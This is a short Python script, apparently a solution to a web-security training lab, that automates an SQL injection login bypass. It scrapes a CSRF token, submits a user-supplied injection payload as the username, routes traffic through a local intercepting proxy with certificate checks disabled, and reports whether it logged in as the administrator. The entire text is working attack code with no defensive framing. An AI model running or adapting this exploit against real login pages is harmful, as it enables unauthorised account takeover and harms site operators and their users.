# basic login vulnerability

import urllib3
import requests
import sys
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies ={'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

def get_csrf_token(sreq, url):
    req = sreq.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(req.text, 'html.parser')
    csrf = soup.find("input")['value']
    return csrf

def exploit_sqli(sreq, url, sqli_payload):
    csrf = get_csrf_token(sreq, url)
    data = {"csrf": csrf,
            "username": sqli_payload,
            "password": "randomtext"}
    req = sreq.post(url, data=data, verify=False, proxies=proxies)
    res = req.text
    if "Log out" in res:
        return True
    else:
        return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        sqli_payload = sys.argv[2].strip()
    except IndexError:
        print('[-] Usage: %s <url> <sql-payload>'% sys.argv[0])
        print('[-] Example: %s www.example.com "1=1"' % sys.argv[0])
        sys.exit(-1)

    sreq = requests.Session()

    if exploit_sqli(sreq, url, sqli_payload):
        print('[+] SQL injection successful! We have logged in as the administrator user.')
    else:
        print('[-] SQL injection unsuccessful.')

